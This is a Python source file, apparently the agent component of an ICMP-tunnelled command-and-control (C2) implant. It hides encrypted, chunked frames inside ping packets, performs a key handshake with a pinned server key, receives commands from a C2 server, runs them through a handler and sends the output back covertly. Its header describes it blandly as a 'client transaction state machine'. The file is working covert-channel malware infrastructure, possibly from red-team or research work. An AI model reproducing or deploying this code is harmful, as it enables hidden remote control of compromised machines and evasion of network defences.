#!/usr/bin/env python3

# *********************************************************
#
# Description: Client transaction state machine managing inbound requests.
# Author: Moshe Yifrah
#
# *********************************************************

# --- Modules ---

from __future__ import annotations

import argparse
import asyncio
import random
import sys
from typing import Tuple, Final
import scapy.all as scapy
from scapy.layers.inet import IP, ICMP
from scapy.packet import Raw

from common import cnc_core, cnc_crypto

# --- Constants & State ---

server_reply_buffer = bytearray()
expected_client_seq = 0
_terminal_state_active = False
_terminal_sequence_id = 0
_terminal_transfer_id = 0

ack_queue: asyncio.Queue[Tuple[int, int]] = asyncio.Queue()
tx_lock = asyncio.Lock()
_is_waiting_for_ack = False
should_agent_exit = False
_needs_reconnect = False

DISPATCHER_TIMEOUT_LIMIT: Final[float] = cnc_core.DISPATCHER_TIMEOUT

SERVER_IDENTITY_PUB_HEX = (
    "aa870b88e1d7591ef21420bf3f5d0a10cc7f2b15aa98f1db453a7faf892c1b8d"
)

_ephemeral_priv = None
handshake_complete_event = asyncio.Event()
_l3_socket = None

# ==============================================================================

# --- Functions ---

def init_l3_socket(iface: str) -> None:
    """Initialize a persistent L3 socket bound to the given interface."""
    global _l3_socket
    _l3_socket = scapy.conf.L3socket(iface=iface)


def init_handshake_psk() -> None:
    """Derive the bootstrap PSK from the pinned server identity public key."""
    cnc_crypto.init_handshake_psk(bytes.fromhex(SERVER_IDENTITY_PUB_HEX))

# ==============================================================================

def is_terminal_state_active() -> bool:
    """Return True while awaiting the end of a multi-chunk response."""
    return _terminal_state_active


def needs_reconnect() -> bool:
    """Return True when repeated ARQ failures signal the session is dead."""
    return _needs_reconnect


def reset_session_state() -> None:
    """Clear all per-session state before a fresh handshake attempt."""
    global _needs_reconnect, _terminal_state_active
    global _terminal_sequence_id, _terminal_transfer_id, expected_client_seq
    _needs_reconnect = False
    _terminal_state_active = False
    _terminal_sequence_id = 0
    _terminal_transfer_id = 0
    expected_client_seq = 0
    server_reply_buffer.clear()
    while not ack_queue.empty():
        ack_queue.get_nowait()

# ==============================================================================

def should_simulate_packet_drop(args: argparse.Namespace) -> bool:
    """Return True with 15% probability when drop simulation is enabled."""
    return args.simulate_drop and random.random() < 0.15

# ==============================================================================

def _sync_send_packet(pkt: scapy.Packet, is_retransmit: bool = False) -> None:
    """Record the RTT start time and transmit a pre-built packet."""
    cnc_core.start_rtt_timer(is_retransmit=is_retransmit)
    _l3_socket.send(pkt)

# ==============================================================================

def _reset_client_rx_state() -> None:
    """Clear inbound reassembly state for a fresh transfer."""
    global expected_client_seq, _terminal_state_active
    expected_client_seq = 0
    _terminal_state_active = False
    server_reply_buffer.clear()

# ==============================================================================

def send_control_reset_packet(args: argparse.Namespace) -> None:
    """Reset local RX state and send a RESET frame to the server."""
    _reset_client_rx_state()
    frame = cnc_core.pad_to_ping_size(cnc_core.encode_control_frame(cnc_core.OPCODE_RESET))
    pkt = cnc_core.build_icmp_packet(
        args.server_ip, cnc_core.ICMP_ECHO_REQUEST_TYPE, frame, args.source_ip,
        icmp_id=cnc_core.get_icmp_id(), icmp_seq=cnc_core.get_next_icmp_seq(),
    )
    _l3_socket.send(pkt)

# ==============================================================================

async def _tx_arq_client_loop(
    pkt: scapy.Packet, transfer_id: int, seq_id: int
) -> bool:
    """Transmit one packet with ARQ retries; True on ACK, False on timeout."""
    global _is_waiting_for_ack
    loop = asyncio.get_running_loop()
    retry_count = 0
    while retry_count < cnc_core.MAX_RETRANSMIT_ATTEMPTS:
        if should_agent_exit:
            return False
        while not ack_queue.empty():
            ack_queue.get_nowait()
        _is_waiting_for_ack = True
        await loop.run_in_executor(None, _sync_send_packet, pkt, retry_count > 0)
        try:
            ack_tid, ack_seq = await asyncio.wait_for(
                ack_queue.get(),
                timeout=cnc_core.get_adaptive_timeout(retry_count),
            )
            if (ack_tid, ack_seq) == (transfer_id, seq_id):
                return True
        except asyncio.TimeoutError:
            retry_count += 1
    return False

# ==============================================================================

async def send_request_chunks_reliably(
    args: argparse.Namespace,
    raw_bytes_payload: bytes,
    app_opcode: int = cnc_core.CMD_KEEPALIVE,
) -> None:
    """Chunk and deliver each chunk to the server with ARQ guarantees."""
    global _is_waiting_for_ack, _needs_reconnect
    transfer_id, frames = cnc_core.prepare_transfer_frames(
        raw_bytes_payload, cnc_core.OPCODE_CMD, app_opcode
    )
    total = len(frames)
    verbose = app_opcode != cnc_core.CMD_KEEPALIVE
    if verbose:
        print(f"[TX → SERVER] tid={transfer_id:#010x}  {total} chunk(s)")
    async with tx_lock:
        for frame_bytes, seq_id in frames:
            if verbose:
                print(f"[TX → SERVER] sending chunk {seq_id}/{total}  seq={seq_id}")
            pkt = cnc_core.build_icmp_packet(
                args.server_ip, cnc_core.ICMP_ECHO_REQUEST_TYPE,
                cnc_core.pad_to_ping_size(frame_bytes), args.source_ip,
                icmp_id=cnc_core.get_icmp_id(), icmp_seq=cnc_core.get_next_icmp_seq(),
            )
            success = await _tx_arq_client_loop(pkt, transfer_id, seq_id)
            _is_waiting_for_ack = False
            if verbose and success:
                print(f"[TX → SERVER] chunk {seq_id}/{total}  ACK'd")
            if not success:
                _needs_reconnect = True
                send_control_reset_packet(args)
                return

# ==============================================================================

def send_acknowledgment_packet(
    args: argparse.Namespace, transfer_id: int, seq_id: int
) -> None:
    """Send an ACK frame for the given transfer and sequence IDs."""
    frame = cnc_core.pad_to_ping_size(cnc_core.encode_control_frame(
        cnc_core.OPCODE_ACK, transfer_id, seq_id
    ))
    pkt = cnc_core.build_icmp_packet(
        args.server_ip, cnc_core.ICMP_ECHO_REQUEST_TYPE, frame, args.source_ip,
        icmp_id=cnc_core.get_icmp_id(), icmp_seq=cnc_core.get_next_icmp_seq(),
    )
    _l3_socket.send(pkt)

# ==============================================================================

def process_raw_sniffer_packet(
    packet, args, inbound_queue, event_loop
) -> None:
    """Filter and enqueue raw payloads from the server IP only."""
    if not cnc_core.is_valid_icmp_packet(packet):
        return
    if (packet[IP].src == args.server_ip
            and packet[ICMP].type == cnc_core.ICMP_ECHO_REPLY_TYPE):
        event_loop.call_soon_threadsafe(
            inbound_queue.put_nowait, bytes(packet[Raw].load)
        )

# ==============================================================================

def _handle_shutdown() -> None:
    """Print a shutdown notice, zeroize crypto, and set the exit flag."""
    global should_agent_exit
    print(
        "\n[!] Server connection terminated. Shutting down agent.",
        file=sys.stderr, flush=True,
    )
    cnc_crypto.destroy_session_crypto()
    should_agent_exit = True

# ==============================================================================

def _handle_reset_frame(chunk_data: bytes) -> None:
    """Complete a handshake or reset RX state on a bare RESET frame."""
    if chunk_data.startswith(b"HS_RESP:"):
        payload = chunk_data[8:]
        if len(payload) == 96:
            srv_eph_pub = payload[:32]
            signature = payload[32:]
            if finalize_handshake(srv_eph_pub, signature):
                handshake_complete_event.set()
        return
    _reset_client_rx_state()

# ==============================================================================

async def _handle_inbound_ack(
    args: argparse.Namespace, transfer_id: int, seq_id: int
) -> None:
    """Route an inbound ACK into the ARQ queue, simulating drops if set."""
    if not _is_waiting_for_ack:
        return
    if should_simulate_packet_drop(args):
        return
    cnc_core.update_rtt_measurement()
    await ack_queue.put((transfer_id, seq_id))

# ==============================================================================

async def process_server_frame(
    raw_payload: bytes, args: argparse.Namespace, handler_callback
) -> None:
    """Decode and route one raw server frame to the correct handler."""
    parsed = cnc_core.decode_and_verify_frame(
        raw_payload, cnc_core.get_psk()
    )
    if parsed is None:
        return
    net_op, app_op, flags, transfer_id, seq_id, chunk_data = parsed
    if net_op == cnc_core.OPCODE_SHUTDOWN:
        _handle_shutdown()
    elif net_op == cnc_core.OPCODE_RESET:
        _handle_reset_frame(chunk_data)
    elif net_op == cnc_core.OPCODE_ACK:
        await _handle_inbound_ack(args, transfer_id, seq_id)
    elif net_op == cnc_core.OPCODE_RES:
        await _handle_inbound_res_state(
            args, flags, transfer_id, seq_id, chunk_data,
            app_op, handler_callback,
        )

# ==============================================================================

async def _handle_inbound_res_state(
    args: argparse.Namespace,
    flags: int,
    tid: int,
    seq: int,
    chunk: bytes,
    app_op: int,
    handler_callback,
) -> None:
    """Reassemble inbound RES chunks, ACK each, and trigger logic on EOF."""
    global server_reply_buffer, expected_client_seq
    global _terminal_state_active, _terminal_sequence_id, _terminal_transfer_id
    current_abs_seq = abs(seq)
    if _terminal_state_active and tid == _terminal_transfer_id and seq == _terminal_sequence_id:
        send_acknowledgment_packet(args, tid, seq)
        return
    if _terminal_state_active:
        return
    if current_abs_seq <= expected_client_seq and expected_client_seq > 0:
        send_acknowledgment_packet(args, tid, seq)
        return
    if current_abs_seq == expected_client_seq + 1:
        expected_client_seq = current_abs_seq
        server_reply_buffer.extend(chunk)
        send_acknowledgment_packet(args, tid, seq)

        if flags & cnc_core.FLAG_EOF:
            _terminal_state_active = True
            _terminal_sequence_id = seq
            _terminal_transfer_id = tid
            full_command_bytes = bytes(server_reply_buffer)
            server_reply_buffer.clear()
            expected_client_seq = 0

            asyncio.create_task(
                trigger_agent_logic(
                    full_command_bytes, app_op, args, handler_callback
                )
            )

# ==============================================================================

async def trigger_agent_logic(
    full_command_bytes: bytes,
    app_opcode: int,
    args: argparse.Namespace,
    handler_callback,
) -> None:
    """Run the handler callback for a full command and send the response."""
    global _terminal_state_active
    loop = asyncio.get_running_loop()
    cmd_output_bytes = await loop.run_in_executor(
        None, handler_callback, app_opcode, full_command_bytes
    )
    await send_request_chunks_reliably(args, cmd_output_bytes, app_opcode)
    _terminal_state_active = False

# ==============================================================================

async def reactive_client_dispatcher(
    inbound_queue: asyncio.Queue[bytes],
    args: argparse.Namespace,
    handler_callback,
) -> None:
    """Drain the inbound queue and forward each frame to the frame processor."""
    while not should_agent_exit:
        try:
            raw_payload = await asyncio.wait_for(
                inbound_queue.get(), timeout=DISPATCHER_TIMEOUT_LIMIT
            )
            await process_server_frame(raw_payload, args, handler_callback)
            inbound_queue.task_done()
        except asyncio.TimeoutError:
            continue

# ==============================================================================

def finalize_handshake(server_eph_pub: bytes, signature: bytes) -> bool:
    """Verify the server's signed ephemeral key and derive the session key."""
    global _ephemeral_priv
    if _ephemeral_priv is None:
        return False

    if not cnc_crypto.verify_ephemeral_key(
        SERVER_IDENTITY_PUB_HEX, server_eph_pub, signature
    ):
        print(
            "[!] Server signature verification FAILED! MitM suspected.",
            file=sys.stderr,
        )
        _ephemeral_priv = None
        return False

    cnc_crypto.derive_and_set_session_key(_ephemeral_priv, server_eph_pub)
    _ephemeral_priv = None
    return True

# ==============================================================================

async def perform_client_handshake(args: argparse.Namespace) -> bool:
    """Send HS_INIT frames and wait for HS_RESP to complete key exchange."""
    global _ephemeral_priv
    cnc_crypto.destroy_session_crypto()
    handshake_complete_event.clear()

    _ephemeral_priv, my_pub_bytes = cnc_crypto.generate_ephemeral_keypair()
    hs_payload = b"HS_INIT:" + my_pub_bytes

    loop = asyncio.get_running_loop()
    for attempt in range(cnc_core.MAX_RETRANSMIT_ATTEMPTS):
        if should_agent_exit:
            return False
        tid = random.getrandbits(32)
        frame = cnc_core.encode_frame(
            hs_payload, cnc_core.OPCODE_RESET, cnc_core.CMD_KEEPALIVE,
            tid, 1, True, cnc_core.get_psk(),
        )
        pkt = cnc_core.build_icmp_packet(
            args.server_ip, cnc_core.ICMP_ECHO_REQUEST_TYPE, frame, args.source_ip,
            icmp_id=cnc_core.get_icmp_id(), icmp_seq=cnc_core.get_next_icmp_seq(),
        )
        await loop.run_in_executor(None, _sync_send_packet, pkt)

        try:
            await asyncio.wait_for(
                handshake_complete_event.wait(), timeout=2.0
            )
            return True
        except asyncio.TimeoutError:
            print(f"[Client] Handshake timeout, retrying ({attempt + 1})...")

    _ephemeral_priv = None
    return False
